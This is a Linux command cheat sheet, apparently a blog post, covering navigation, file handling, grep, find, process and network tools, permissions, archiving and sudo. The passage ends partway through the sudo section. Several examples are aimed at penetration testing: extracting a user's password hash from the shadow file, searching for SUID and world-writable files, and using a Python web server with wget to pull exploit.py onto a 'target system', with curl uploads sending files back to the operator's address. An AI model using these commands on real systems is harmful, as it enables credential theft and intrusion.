---
layout: post
title: "Comprehensive Linux Command Guide"
date: 2024-04-28
categories: CheatSheets
---

## Table of Contents

1. [Introduction to Linux Commands](#introduction-to-linux-commands)
2. [Understanding the Linux Command Line](#understanding-the-linux-command-line)
3. [The Power of the Command Line](#the-power-of-the-command-line)
4. [Key Linux Commands and Their Usage](#key-linux-commands-and-their-usage)
    1. [Navigating Directories](#navigating-directories)
        1. [`pwd` (Print Working Directory)](#pwd-print-working-directory)
        2. [`ls` (List)](#ls-list)
        3. [`cd` (Change Directory)](#cd-change-directory)
    2. [File Management](#file-management)
        1. [Copying Files and Directories with `cp`](#copying-files-and-directories-with-cp)
        2. [Moving and Renaming Files with `mv`](#moving-and-renaming-files-with-mv)
        3. [Removing Files and Directories with `rm`](#removing-files-and-directories-with-rm)
        4. [`ln` (Create Links)](#ln-create-links)
        5. [Creating Files with `touch`](#creating-files-with-touch)
    3. [Using Wildcards Effectively](#using-wildcards-effectively)
    4. [Viewing and Manipulating File Content](#viewing-and-manipulating-file-content)
        1. [`cat` (Concatenate and Display Files)](#cat-concatenate-and-display-files)
        2. [`head` and `tail`](#head-and-tail)
        3. [`grep` (Global Regular Expression Print)](#grep-global-regular-expression-print)
        4. [`cut` (Remove Sections from Each Line of Files)](#cut-remove-sections-from-each-line-of-files)
    5. [File Searching and Handling](#file-searching-and-handling)
        1. [`locate` (Find Files)](#locate-find-files)
        2. [`whereis` (Locate the Binary, Source, and Manual Page Files for Commands)](#whereis-locate-the-binary-source-and-manual-page-files-for-commands)
        3. [`find` (Search for Files and Directories)](#find-search-for-files-and-directories)
    6. [System Monitoring](#system-monitoring)
        1. [`top` (Task Manager)](#top-task-manager)
        2. [`ps` (Process Status)](#ps-process-status)
        3. [`df` (Disk Free)](#df-disk-free)
        4. [`free` (Memory Usage)](#free-memory-usage)
        5. [`kill` and `killall` (Terminate Processes)](#kill-and-killall-terminate-processes)
    7. [Network Operations](#network-operations)
        1. [`ping`](#ping)
        2. [`netstat` (Network Statistics)](#netstat-network-statistics)
        3. [`wget`](#wget)
        4. [Transferring Files with SimpleHTTPServer and `wget`](#transferring-files-with-simplehttpserver-and-wget)
        5. [`curl`](#curl)
    8. [Permissions and Ownership](#permissions-and-ownership)
        1. [`chmod` (Change Mode)](#chmod-change-mode)
        2. [`chown` (Change Owner)](#chown-change-owner)
    9. [Archiving and Compression](#archiving-and-compression)
        1. [`tar` (Tape Archive)](#tar-tape-archive)
        2. [`gzip` (GNU Zip)](#gzip-gnu-zip)
5. [Running Commands as Superuser](#running-commands-as-superuser)
    1. [`sudo` (Superuser Do)](#sudo-superuser-do)
6. [Utilizing Linux Commands Effectively](#utilizing-linux-commands-effectively)
    1. [Combining Commands with Pipes](#combining-commands-with-pipes)
    2. [Redirections in Commands](#redirections-in-commands)
    3. [Advanced Command Chaining](#advanced-command-chaining)
        1. [Using Bash History and Shortcuts](#using-bash-history-and-shortcuts)
7. [Using `man` Pages and `--help` for Command Documentation](#using-man-pages-and---help-for-command-documentation)
    1. [The `man` Command](#the-man-command)
        1. [Basic Usage](#basic-usage)
        2. [Example](#example)
        3. [Navigating `man` Pages](#navigating-man-pages)
    2. [The `--help` Option](#the---help-option)
        1. [Basic Usage](#basic-usage-1)
        2. [Example](#example-1)
    3. [Examples of Using `man` and `--help`](#examples-of-using-man-and---help)
        1. [Using `man` to Learn About `grep`](#using-man-to-learn-about-grep)
        2. [Using `--help` to Quickly Reference `tar` Options](#using---help-to-quickly-reference-tar-options)
    4. [Practical Tips](#practical-tips)
        1. [Combine `man` with `grep`](#combine-man-with-grep)
        2. [Print a Section of the Manual Page](#print-a-section-of-the-manual-page)
8. [Advanced Package Tool](#advanced-package-tool)
    1. [The `apt` Command](#the-apt-command)
9. [Glossary](#glossary)

---

## Introduction to Linux Commands

Linux commands are the essence of Linux administration, allowing users to execute tasks and manage their systems via the command line interface. This guide provides an overview of common Linux commands and their usage, with a structured approach to learning how these commands work.

### Understanding the Linux Command Line

The Linux command line, accessed through the terminal, offers direct communication with the operating system through commands entered by the user. It is a powerful tool used for file management, software installation, system monitoring, and executing scripts.

### The Power of the Command Line

The command line interface (CLI) is more flexible and powerful than graphical user interfaces (GUIs) for many tasks. It allows users to execute multiple commands quickly and automate processes via scripts. Understanding how to use the CLI effectively can significantly enhance productivity and administrative capabilities.

## Key Linux Commands and Their Usage

Let’s delve into the basics of essential Linux commands, offering examples to help express their functionality.

### Navigating Directories

- **`pwd` (Print Working Directory)**:
  Displays the current directory path.

  ```bash
  pwd
  ```

- **`ls` (List)**:
  Lists all files and directories in the current directory.

  ```bash
  ls
  ls -l  # detailed list
  ls -a  # include hidden files
  ```

- **`cd` (Change Directory)**:
  Changes the current directory to a specified path, with various shortcuts to navigate efficiently.

  ```bash
  cd /path/to/directory  # Change to a specific directory
  cd ..  # Go up one directory level
  cd  # Go to the home directory
  cd -  # Switch to the last directory you were in
  cd /  # Change to the root directory
  ```

### File Management

#### Copying Files and Directories with `cp`

- **`cp` (Copy Files and Directories)**:
  Copies files or directories from one location to another, with options to handle special cases.

  ```bash
  cp source.txt destination.txt  # Copy one file to another location
  cp -r source_directory destination_directory  # Recursively copy entire directories
  cp -u src/*.txt dest/  # Copy all TXT files that are newer than the destination
  cp -v *.jpg /backup/  # Verbosely copy all JPG files to a backup directory
  cp -a /source/. /backup/  # Archive files, preserving all file attributes and links
  ```

#### Moving and Renaming Files with `mv`

- **`mv` (Move/Rename Files and Directories)**:
  Moves or renames files and directories, also using wildcards to operate on multiple items.

  ```bash
  mv oldname.txt newname.txt  # Rename a file within the same directory
  mv file.txt /path/to/directory/  # Move a file to a different directory
  mv *.txt archive/  # Move all TXT files to the 'archive' directory
  mv /backup/*.jpg /new_backup/  # Move all JPG files from one backup directory to another
  mv -i oldfile.txt newfile.txt  # Rename a file, with prompt before overwrite
  ```

#### Removing Files and Directories with `rm`

- **`rm` (Remove Files or Directories)**:
  Deletes files or directories, with options to manage risk and feedback.

  ```bash
  rm file.txt  # Remove a single file
  rm -r directory_name  # Recursively remove a directory and its

 contents
  rm -i *.txt  # Interactive mode to confirm removal of all TXT files
  rm -f *.bak  # Force removal of all BAK files without prompting
  rm -v old_logs/*.log  # Verbosely remove all LOG files in the 'old_logs' directory

  ```

#### `ln` (Create Links)

- **Purpose**: Creates a link to a file or directory, which can be either a symbolic link (symlink) or a hard link.
- **Usage**:
  - Create a symbolic link:

    ```bash
    ln -s target.txt symlink.txt
    ```

  - Create a hard link:

    ```bash
    ln target.txt hardlink.txt
    ```

#### Creating Files with `touch`

- **`touch` (Create Files)**:
  The `touch` command is primarily used to create an empty file.

  ```bash
  touch newfile.txt  # Create a new empty file called newfile.txt
  ```

### Using Wildcards Effectively

Wildcards (`*` and `?`) are incredibly useful in file management commands to specify groups of files or directories:

- **`*` (Asterisk)**: Represents zero or more characters. For example, `*.txt` refers to all files with a `.txt` extension.
- **`?` (Question Mark)**: Represents exactly one character. For example, `file?.txt` could match `file1.txt`, `file2.txt`, etc., but not `file10.txt`.

These wildcards can be combined in various ways to fine-tune command behavior, making them powerful tools for managing large numbers of files with single commands. By integrating these advanced uses into your workflow, you'll be able to navigate and manage files on your Linux system with greater efficiency and precision.

### Viewing and Manipulating File Content

Viewing and manipulating file content efficiently is a crucial skill in Linux system management. Commands like `cat`, `head`, `tail`, `grep`, and `cut` provide powerful options for these tasks. Below, I'll expand particularly on `grep` and `cut`, providing more examples and insights into their versatility.

#### `cat` (Concatenate and Display Files)

- Displays the content of one or more files on the screen.

  ```bash
  cat filename.txt
  ```

- Concatenate multiple files and display them:

  ```bash
  cat file1.txt file2.txt file3.txt
  ```

#### `head` and `tail`

- Shows the first or last parts of files, useful for previewing or reviewing logs and other text files.

  ```bash
  head -n 5 filename.txt  # Displays the first 5 lines
  tail -n 5 filename.txt  # Displays the last 5 lines
  ```

#### `grep` (Global Regular Expression Print)

- Searches for patterns within files, using regular expressions. This command is essential for filtering output or files for specific content.

##### Basic `grep` Usage

- Search for a specific string in a file:

  ```bash
  grep 'search_term' filename.txt
  ```

- Case-insensitive search:

  ```bash
  grep -i 'search' filename.txt
  ```

##### Expanded Examples

- **Line Number Display**: Find a term and show line numbers in the file.

  ```bash
  grep -n 'error' log.txt
  ```

  This command searches for the string "error" in `log.txt` and displays the lines with their corresponding line numbers.

- **Count Occurrences**: Count how many times a pattern appears in a file.

  ```bash
  grep -c 'warning' log.txt
  ```

  This displays the number of times "warning" appears in `log.txt`.

- **Highlight Matches**: Highlight the matching strings when displaying the results. This is particularly useful when combing through dense log files.

  ```bash
  grep --color 'fail' server.log
  ```

- **Recursive Search**: Search for a pattern in all files under a directory and its subdirectories.

  ```bash
  grep -r 'getConfig()' ./project
  ```

  This command recursively searches for the term "getConfig()" in all files within the `project` directory.

- **Invert Match**: Display lines that do not match the search pattern.

  ```bash
  grep -v 'pass' test_results.log
  ```

  This command lists all lines that do not contain the word "pass", which can help in quickly finding failed cases in logs.

- **Match Multiple Patterns**: Use multiple patterns to refine search results.

  ```bash
  grep -e 'error' -e 'warning' application.log
  ```

  This will find lines containing either "error" or "warning" in `application.log`.

- **Search with Regular Expressions**: Use regular expressions to search for more complex patterns.

  ```bash
  grep '^[0-9]' file.txt
  ```

  This searches for lines starting with a digit in `file.txt`.

These `grep` examples show how versatile the command can be when dealing with text data. By mastering `grep` along with `cat`, `head`, and `tail`, you can handle most tasks related to file content viewing and manipulation on Linux with ease.

#### `cut` (Remove Sections from Each Line of Files)

- The `cut` command is used to extract specific sections from each line of a file. It is particularly useful for parsing structured data like CSV files or system logs.

##### Basic `cut` Usage

- Extract specific columns from a file:

  ```bash
  cut -d ':' -f 1 /etc/passwd
  ```

  This command extracts the first field from each line of the `/etc/passwd` file, using the colon (`:`) as the delimiter.

##### Expanded Examples

- **Extract Multiple Fields**: Extract more than one field from each line.

  ```bash
  cut -d ':' -f 1,3 /etc/passwd
  ```

  This extracts the first and third fields from each line of the `/etc/passwd` file.

- **Specify a Range of Fields**: Use a range to specify multiple fields.

  ```bash
  cut -d ':' -f 1-3 /etc/passwd
  ```

  This extracts the first three fields from each line of the `/etc/passwd` file.

- **Use a Different Delimiter**: Specify a different delimiter if your data uses something other than colons.

  ```bash
  cut -d ',' -f 2,4 data.csv
  ```

  This extracts the second and fourth fields from each line of the `data.csv` file, using a comma as the delimiter.

##### Combining `cut` with Other Commands

- **Extract Specific User's Hash**: Combine `cat`, `grep`, and `cut` to extract a specific user's hash from the `shadow` file.

  ```bash
  cat shadow | grep '^frank:' | cut -d ':' -f 2
  ```

  This command displays the contents of the `shadow` file, filters the line starting with `frank:`, and then extracts Frank's password hash.

By mastering `cut` along with `cat`, `head`, `tail`, and `grep`, you can efficiently parse and manipulate text data in Linux, making it easier to handle a wide variety of tasks.

### File Searching and Handling

Efficient file searching and command resource location are key aspects of navigating and managing a Linux environment. The `locate`, `whereis`, and `find` commands are valuable tools in this regard, helping users quickly find files and command-related resources. Below are descriptions and additional examples to help utilize these commands more effectively.

#### `locate` (Find Files)

- **Purpose**: The `locate` command searches for files by name across the entire file system, making use of a database that maps the paths of installed files. This database is usually updated nightly by the `updatedb` command, ensuring search results are fast but not always up-to-the-minute accurate.

- **Usage**:

  ```bash
  locate pattern
  ```

  Searches for all files and directories that match the pattern provided.

- **Examples**:
  - Find all `.jpg` files that contain "vacation" in their name:

    ```bash
    locate vacation*.jpg
    ```

  - Limit search results to display only the first 10 entries:

    ```bash
    locate pattern | head -n 10
    ```

- **Advantages**: `locate` is much faster than `find` for most searches, as it searches a pre-built database rather than scanning directories.

- **Limitations**: The results depend on the last database update (`updatedb`); newly created files after the last update won't be found.

#### `whereis` (Locate the Binary, Source, and Manual Page Files for Commands)

- **Purpose**: This command is used to locate the binary, source code, and manual page files for a given command. It is useful for quickly finding important files related to installed programs.

- **Usage**:

  ```bash
  whereis command
  ```

  Finds locations related to the `command`.

- **Examples**:
  - Find the binary, source, and manuals for the `gcc` compiler:

    ```bash
    whereis gcc
    ```

  - Locate the configuration files for the `nginx` web server (commonly located in directories also listed by `whereis`):

    ```bash
    whereis nginx
    ```

- **Options**:
  - `-b`: Locate only the binary for the command.

    ```bash
    whereis -b nginx
    ```

- `-m`: Locate only the manual sections for the command.

    ```bash
    whereis -m ls
    ```

- `-s`: Locate only the source files for the command.

    ```bash
    whereis -s bash
    ```

- **Advantages**: `whereis` is particularly useful for developers and system administrators who need to quickly check where various components of a program are stored.

#### `find` (Search for Files and Directories)

- **Purpose**: The `find` command is used to search for files and directories within a directory hierarchy. It is highly flexible and powerful, with numerous options for refining searches based on various criteria.

- **Usage**:

  ```bash
  find [path] [expression]
  ```

  Searches for files and directories in the specified path that match the given expression.

- **Examples**:
  - Find a file named "flag1.txt" in the current directory:

    ```bash
    find . -name flag1.txt
    ```

  - Find the file named "flag1.txt" in the `/home` directory:

    ```bash
    find /home -name flag1.txt
    ```

  - Find a directory named "config" under the root directory:

    ```bash
    find / -type d -name config
    ```

  - Find files with 777 permissions (readable, writable, and executable by all users):

    ```bash
    find / -type f -perm 0777
    ```

  - Find executable files:

    ```bash
    find / -perm a=x
    ```

  - Find all files for user "frank" under the `/home` directory:

    ```bash
    find /home -user frank
    ```

  - Find files that were modified in the last 10 days:

    ```bash
    find / -mtime 10
    ```

  - Find files that were accessed in the last 10 days:

    ```bash
    find / -atime 10
    ```

  - Find files changed within the last hour (60 minutes):

    ```bash
    find / -cmin -60
    ```

  - Find files accessed within the last hour (60 minutes):

    ```bash
    find / -amin -60
    ```

  - Find files with a size of 50 MB:

    ```bash
    find / -size 50M
    ```

  - Find files larger than 100 MB:

    ```bash
    find / -size +100M
    ```

  - Redirect errors to `/dev/null` for cleaner output:

    ```bash
    find / -type f 2>/dev/null
    ```

  - Find world-writable directories:

    ```bash
    find / -writable -type d 2>/dev/null
    ```

  - Find world-executable directories:

    ```bash
    find / -perm -o x -type d 2>/dev/null
    ```

  - Find development tools and supported languages:

    ```bash
    find / -name perl*
    find / -name python*
    find / -name gcc*
    ```

  - Find files with the SUID bit set:

    ```bash
    find / -perm -u=s -type f 2>/dev/null
    ```

By utilizing `locate`, `whereis`, and `find`, users can dramatically streamline the process of finding files and understanding the layout of command resources on their system, thus enhancing workflow efficiency and system navigation. These commands complement each other, with `locate` offering broad filesystem searches, `whereis` providing targeted lookups for command-specific files, and `find` enabling in-depth searches with various criteria.

### System Monitoring

System monitoring is crucial for maintaining the health and performance of Linux systems. It involves observing system resources, managing processes, and ensuring optimal use of hardware capabilities. Here’s a look at essential system monitoring commands, particularly focusing on the `ps` command and its integration with other tools to manage system processes effectively.

#### `top` (Task Manager)

- **Purpose**: Continuously updates and displays information about the top CPU-consuming processes.
- **Usage**:

  ```bash
  top
  ```

- **Key Features**:
  - Interactive commands to sort by CPU, memory usage, etc.
  - Real-time updates to process metrics.

#### `ps` (Process Status)

- **Purpose**: Provides a snapshot of currently running processes, displaying detailed information including the process ID (PID), user, CPU usage, memory usage, and command line.
- **Basic Usage**:

  ```bash
  ps aux
  ```

- **Advanced Examples**:
  - List all processes with detailed info:

    ```bash
    ps aux
    ```

  - Show processes for a specific user:

    ```bash
    ps -u username
    ```

  - Find processes by name:

    ```bash
    ps aux | grep processname
    ```

- **Integrating `ps` with `grep` to Manage Processes**:
  - Identify and kill a non-responsive process:

    ```bash
    ps aux | grep 'processname' | awk '{print $2}' | xargs kill
    ```

    This pipeline filters processes by name, extracts their PIDs, and sends a kill signal to terminate them.

#### `df` (Disk Free)

- **Purpose**: Displays the amount of disk space used and available on mounted filesystems.
- **Usage**:

  ```bash
  df -h  # Displays in human-readable format
  ```

- **Examples**:
  - Show disk space usage for all mounted filesystems:

    ```bash
    df -h
    ```

  - Show disk usage of a specific filesystem:

    ```bash
    df -h /dev/sda1
    ```

#### `free` (Memory Usage)

- **Purpose**: Shows the amount of free and used memory in the system, including both physical and swap memory.
- **Usage**:

  ```bash
  free -h  # Displays in human-readable format
  ```

- **Examples**:
  - Detailed memory usage:

    ```bash
    free -m  # Output in MB
    ```

#### `kill` and `killall` (Terminate Processes)

- **`kill`**:
  - **Purpose**: Sends a signal to a single process, typically to stop the process.
  - **Usage**:

    ```bash
    kill [signal or option] PID
    ```

  - **Examples**:
    - Kill a process with a specific PID:

      ```bash
      kill 12345
      ```

    - Send the SIGKILL signal to forcefully stop a process:

      ```bash
      kill -9 12345
      ```

- **`killall`**:
  - **Purpose**: Sends a signal to all processes running any of the specified commands.
  - **Usage**:

    ```bash
    killall [options] processname
    ```

  - **Examples**:
    - Kill all instances of "firefox":

      ```bash
      killall firefox
      ```

    - Use the SIGKILL signal to forcefully terminate all instances of a process:

      ```bash
      killall -9 nginx
      ```

Incorporating these commands into your system monitoring routines can help you maintain better control over your Linux environment, from managing resources efficiently to troubleshooting and resolving process-related issues promptly. By using `ps` in combination with `grep`, `awk`, `kill`, and `killall`, administrators can effectively manage processes, ensuring the system runs smoothly.

### Network Operations

#### Checking Network Connections with `ping`

- **`ping`**:
  Checks the network connection to a server.

  ```bash
  ping example.com
  ```

### Network Operations

#### Displaying Network Statistics with `netstat`

- **`netstat` (Network Statistics)**:
  Displays network connections, routing tables, and interface statistics. The `netstat` command can be used with several different options to gather detailed information on existing connections.

  - **Show All Connections and Listening Ports**:

    ```bash
    netstat -a  # Displays all listening ports and established connections
    ```

  - **Show TCP or UDP Protocols**:

    ```bash
    netstat -at  # List only TCP connections
    netstat -au  # List only UDP connections
    ```

  - **List Ports in Listening Mode**:

    ```bash
    netstat -l  # List ports in listening mode
    netstat -lt # List only TCP ports in listening mode
    netstat -lu # List only UDP ports in listening mode
    ```

  - **List Network Usage Statistics by Protocol**:

    ```bash
    netstat -s  # List network usage statistics by protocol
    netstat -st # Limit the output to TCP protocol statistics
    netstat -su # Limit the output to UDP protocol statistics
    ```

  - **List Connections with Service Name and PID Information**:

    ```bash
    netstat -tp  # List connections with service name and PID information
    netstat -ltp # List listening ports with service name and PID information
    ```

  - **Show Interface Statistics**:

    ```bash
    netstat -i  # Shows interface statistics
    ```

  - **Display All Sockets Without Resolving Names**:

    ```bash
    netstat -ano  # Display all sockets, do not resolve names, and display timers
    ```

By using these options, you can gather comprehensive details about the network state and troubleshoot

 network issues effectively.

#### Downloading Files with `wget`

- **`wget`**:
  Downloads files from the internet.

  ```bash
  wget http://example.com/file.txt
  ```

#### Transferring Files with SimpleHTTPServer, UploadServer, `wget`, and `curl`

You can transfer files between your machine and a target system using the SimpleHTTPServer Python module with `wget` for downloads, and `uploadserver` with `curl` for uploads.

---

**Using SimpleHTTPServer to Host Files**:

- **SimpleHTTPServer**:  
  SimpleHTTPServer is a Python module that allows you to quickly set up a web server to serve files from a directory. This is useful for transferring files to another machine on the same network.

  **Starting SimpleHTTPServer**:

  For Python 3.x:
  ```bash
  cd /path/to/your/files
  python3 -m http.server 8000
  ```

  For Python 2.x:
  ```bash
  cd /path/to/your/files
  python -m SimpleHTTPServer 8000
  ```

  This command starts a simple HTTP server on port 8000, serving files from the specified directory. You can then access these files from any machine on the network by navigating to `http://<your_ip_address>:8000` in a web browser or using `wget`.

---

**Using `wget` to Download Files**:

- **`wget`**:  
  After starting the SimpleHTTPServer on your machine, you can use `wget` on the target system to download the files.

  **Downloading Files with `wget`**:
  ```bash
  wget http://<your_ip_address>:8000/filename
  ```
  Replace `<your_ip_address>` with the IP address of the machine running the SimpleHTTPServer, and `filename` with the name of the file you want to download.

---

**Using UploadServer to Accept File Uploads**:

- **UploadServer**:  
  In addition to hosting files for download, you can set up an upload server to accept incoming files from other machines.

  **Starting the Upload Server**:
  ```bash
  sudo python3 -m uploadserver
  ```

  This command starts an upload server on the default port (typically 8000) that listens for incoming file uploads.

  **Uploading Files with `curl`**:
  ```bash
  curl -X POST http://<your_ip_address>:8000/upload -F 'files=@/path/to/your/file'
  ```
  Replace `<your_ip_address>` with the IP address of the machine running the upload server and `/path/to/your/file` with the path to the file you want to upload.

---

**Example Workflow**:

1. **Start SimpleHTTPServer on Your Machine**:

    For Python 3.x:
    ```bash
    cd /path/to/exploit/code
    python3 -m http.server 8000
    ```

    For Python 2.x:
    ```bash
    cd /path/to/exploit/code
    python -m SimpleHTTPServer 8000
    ```

2. **Download the File on the Target System Using `wget`**:
    ```bash
    wget http://<your_ip_address>:8000/exploit.py
    ```

3. **(Optional) Start the Upload Server to Accept Files**:
    ```bash
    sudo python3 -m uploadserver
    ```

4. **Upload a File from Another System Using `curl`**:
    ```bash
    curl -X POST http://<your_ip_address>:8000/upload -F 'files=@/path/to/your/file'
    ```

By using SimpleHTTPServer with `wget` for downloads and `uploadserver` with `curl` for uploads, you can easily transfer files between machines on the same network, facilitating tasks such as deploying exploit code, sharing data, or receiving files from remote systems.

#### `curl`

The `curl` command is a versatile tool used for transferring data from or to a server using various protocols such as HTTP, HTTPS, FTP, and more. It is widely used for downloading files, testing APIs, and performing web requests from the command line.

##### Basic Usage

- **Downloading a File:**

  ```bash
  curl -O https://example.com/file.txt
  ```

  The `-O` option saves the file with its original filename.

- **Downloading a File with a Custom Filename:**

  ```bash
  curl -o custom_name.txt https://example.com/file.txt
  ```

  The `-o` option allows you to specify a custom filename.

##### Common Use Cases

- **Fetching Web Pages:**

  ```bash
  curl https://www.example.com
  ```

  Retrieves the content of the webpage.

- **Sending Data with POST Requests:**

  ```bash
  curl -X POST -d "name=John&age=30" https://example.com/api
  ```

  Sends data using a POST request to the specified URL.

- **Uploading Files:**

  ```bash
  curl -T localfile.txt ftp://ftp.example.com/remote/path/
  ```

  Uploads a file to an FTP server.

- **Downloading Files from GitHub Repositories:**

  - **Download a Raw File:**

    ```bash
    curl -O https://raw.githubusercontent.com/username/repository/branch/filename
    ```

    Replace `username`, `repository`, `branch`, and `filename` with the appropriate values.

  - **Example:**

    ```bash
    curl -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/special-chars.txt
    ```

- **Authenticating with a Server:**

  ```bash
  curl -u username:password https://example.com
  ```

  Uses basic HTTP authentication.

- **Saving Output to a File:**

  ```bash
  curl https://example.com -o output.html
  ```

- **Including HTTP Headers in the Output:**

  ```bash
  curl -i https://example.com
  ```

- **Customizing HTTP Headers:**

  ```bash
  curl -H "User-Agent: MyUserAgent" https://example.com
  ```

- **Following Redirects:**

  ```bash
  curl -L https://example.com
  ```

  The `-L` option tells `curl` to follow any redirects.

- **Verbose Output for Debugging:**

  ```bash
  curl -v https://example.com
  ```

  Provides detailed information about the request and response.

##### Handling Errors and Troubleshooting

- **Suppressing Progress Meter and Errors:**

  ```bash
  curl -s https://example.com
  ```

  The `-s` option runs `curl` in silent mode.

- **Showing Only HTTP Response Headers:**

  ```bash
  curl -I https://example.com
  ```

  The `-I` option fetches the HTTP headers only.

- **Resuming a Previous Download:**

  ```bash
  curl -C - -O https://example.com/largefile.iso
  ```

  The `-C -` option tells `curl` to continue a previous file transfer.

##### Advanced Usage

- **Sending JSON Data in a POST Request:**

  ```bash
  curl -X POST -H "Content-Type: application/json" -d '{"name":"John","age":30}' https://example.com/api
  ```

- **Using Cookies:**

  - **Save Cookies to a File:**

    ```bash
    curl -c cookies.txt https://example.com
    ```

  - **Send Cookies from a File:**

    ```bash
    curl -b cookies.txt https://example.com
    ```

- **Limiting the Transfer Rate:**

  ```bash
  curl --limit-rate 100K https://example.com/largefile.iso -O
  ```

- **Using Proxy Servers:**

  ```bash
  curl -x http://proxyserver:port https://example.com
  ```

- **FTP Upload with Authentication:**

  ```bash
  curl -T file.txt ftp://ftp.example.com/ --user username:password
  ```

- **Downloading Multiple Files:**

  ```bash
  curl -O https://example.com/file1.txt -O https://example.com/file2.txt
  ```

- **Using Variables in URLs:**

  ```bash
  curl https://example.com/page[1-5].html -O
  ```

  Downloads `page1.html` to `page5.html`.

##### Examples in Scripting

- **Using `curl` in a Bash Script:**

  ```bash
  #!/bin/bash
  response=$(curl -s https://api.example.com/data)
  echo "API Response: $response"
  ```

- **Checking if a Website is Up:**

  ```bash
  if curl -s --head https://example.com | grep "200 OK" > /dev/null
  then
    echo "Website is up"
  else
    echo "Website is down"
  fi
  ```

##### Tips for Effective Use

- **Always Verify URLs:**

  Ensure that the URL is correct and accessible.

- **Use `--help` for More Options:**

  ```bash
  curl --help
  ```

- **Refer to the Manual Page for Detailed Information:**

  ```bash
  man curl
  ```

### Permissions and Ownership

Managing permissions and ownership is crucial for securing and organizing access to files and directories in a Linux environment. The `chmod` and `chown` commands are essential tools for this purpose. Here’s an explanation of these commands and the significance of different permission settings such as 777 and 775.

#### `chmod` (Change Mode)

This command changes the file or directory permissions, which dictate what the owner, a group of users, and others can do with the file. Permissions are specified either in symbolic mode (using letters) or numeric mode (using numbers).

- **Syntax**:

  ```bash
  chmod [options] mode file
  ```

- **Numeric Mode**:
  Permissions are represented by a three-digit number:
  - The first digit represents the owner's permissions.
  - The second digit represents the group's permissions.
  - The third digit represents everyone else's permissions.

  Each digit is a sum of:
  - 4 for read (`r`)
  - 2 for write (`w`)
  - 1 for execute (`x`)

  So, `chmod 755 filename.txt` sets the permissions as follows:
  - Owner can read, write, and execute (7 = 4+2+1).
  - Group can read and execute (5 = 4+1).
  - Others can read and execute (5 = 4+1).

- **Common Permission Settings**:
  - **755**: Commonly used for web servers and applications where files need to be readable and executable by others but only modifiable by the owner.
  - **644**: Often used for web content files, where read and write permissions are necessary for the owner and read-only permissions for everyone else.
  - **777**: Allows all actions for everyone. It's typically discouraged for most uses due to security concerns, as it allows anyone to modify or execute the file.
  - **775**: Enables full permissions for the owner and the group (read, write, execute) and read and execute permissions for others. Useful in environments where a group of users needs to manage files or applications together.

#### `chown` (Change Owner)

This command is used to change the owner and/or the group associated with a file or directory.

- **Syntax**:

  ```bash
  chown [options] user[:group] file
  ```

- **Examples**:
  - Change the owner of `filename.txt` to `user`:

    ```bash
    chown user filename.txt
    ```

  - Change the owner and group of `filename.txt` to `user` and `group`, respectively:

    ```bash
    chown user:group filename.txt
    ```

  - Change the group only, using the colon syntax:

    ```bash
    chown :group filename.txt
    ```

Understanding and correctly setting permissions and ownership are vital for maintaining system security and functionality. Misconfigured permissions can lead to unauthorized access or prevent legitimate users from performing necessary tasks. Therefore, always ensure that you are granting just the necessary rights to users and groups according to the principles of least privilege.

### Archiving and Compression

Archiving and compressing files are fundamental tasks in managing disk space, sharing files, and performing backups on Linux systems. The `tar` and `gzip` commands are among the most commonly used tools for these purposes. Below, we'll explore these commands more deeply, including their various options for zipping and extracting files.

#### `tar` (Tape Archive)

`tar` is a powerful utility for creating and manipulating archive files, which are collections of other files and directories packed into a single file. This tool can also combine archiving with compression for more efficient storage.

- **Creating Archives**:
  The basic syntax for creating a tar archive is:

  ```bash
  tar -cvf archive_name.tar files/
  ```

  - `c` stands for "create".
  - `v` stands for "verbose", meaning it will display the process.
  - `f` specifies the filename of the archive.

- **Extracting Archives**:
  To extract the contents of a tar archive:

  ```bash
  tar -xvf archive_name.tar
  ```

  - `x` stands for "extract".
  - `v` and `f` as before, specify verbose mode and the archive filename, respectively.

- **Combining `tar` with Compression**:
  `tar` can be used with gzip (`gz`), bzip2 (`bz2`), or xz compression directly.
  - To create a compressed archive with gzip:

    ```bash
    tar -czvf archive_name.tar.gz files/
    ```

    - `z` enables gzip compression.
  - To extract a gzip compressed tar archive:

    ```bash
    tar -xzvf archive_name.tar.gz
    ```

  - Similarly, for bzip2 compression:

    ```bash
    tar -cjvf archive_name.tar.bz2 files/
    ```

    - `j` enables bzip2 compression.

  - And for xz compression:

    ```bash
    tar -cJvf archive_name.tar.xz files/
    ```

    - `J` (uppercase) enables xz compression.

#### `gzip` (GNU Zip)

`gzip` is used to compress or expand files using the Lempel-Ziv coding (LZ77). Unlike `tar`, `gzip` does not handle directories but is highly effective for individual files.

- **Compressing Files**:
  To compress a file:

  ```bash
  gzip filename
  ```

  - This replaces the original file with a compressed version (`filename.gz`).

- **Decompressing Files**:
  To decompress a file compressed with `gzip`:

  ```bash
  gzip -d filename.gz
  ```

  - `-d` stands for "decompress".

#### Additional Examples and Tips

- **Compress Multiple Files**: While `gzip` can't directly compress multiple files, you can use `tar` in combination with `gzip` for this purpose.

  ```bash
  tar czvf archive.tar.gz file1 file2 dir1
  ```

- **View Archive Contents**: To view the contents of a tar archive without extracting them:

  ```bash
  tar tvf archive_name.tar
  ```

  - `t` stands for "list", which lists the contents.

- **Incremental Backups**: Use `tar` for incremental backups, specifying files changed since a certain date:

  ```bash
  tar cvf --newer-mtime="yyyy-mm-dd" backup.tar /path/to/directory
  ```

- **Exclude Files**: You can exclude certain files from being archived:

  ```bash
  tar cvf archive.tar --exclude="*.tmp" directory/
  ```

Understanding these tools and their options can greatly enhance your ability to manage files effectively on Linux, from simple backups to complex automated tasks involving large data sets.

## Running Commands as Superuser

When managing a Linux system, certain tasks require elevated privileges. The `sudo` (Superuser Do) command allows a permitted user to execute a command as the superuser or another user, as specified by the security policy. Using `sudo` effectively can help you perform administrative tasks without logging in as

 the root user.

### `sudo` (Superuser Do)

The `sudo` command is used to run commands with elevated privileges. This is essential for tasks such as installing software, modifying system configurations, and managing users.

**Basic Usage**:

```bash
sudo command
```

**Example**:

- **Updating Package Lists**:

  ```bash
  sudo apt-get update
  ```

  This command updates the package lists for upgrades and new installations on Debian-based systems.

### `sudo -i` (Login Shell)

The `sudo -i` option is used to start a login shell as the root user. This simulates a full root login, setting up the environment as if the root user had logged in directly, including reading and executing the root user's login scripts.

**Basic Usage**:

```bash
sudo -i
```

This command switches to a new shell with root privileges, initializing the environment as the root user. This is particularly useful when you need to perform multiple administrative tasks and want to maintain the root environment.

### `sudo -su` (Switch User with a Shell)

The `sudo -su` option is used to switch the current user to the superuser (root) or another specified user and provide a shell. This combines the functionalities of `sudo` and `su` (substitute user) into one command.

**Basic Usage**:

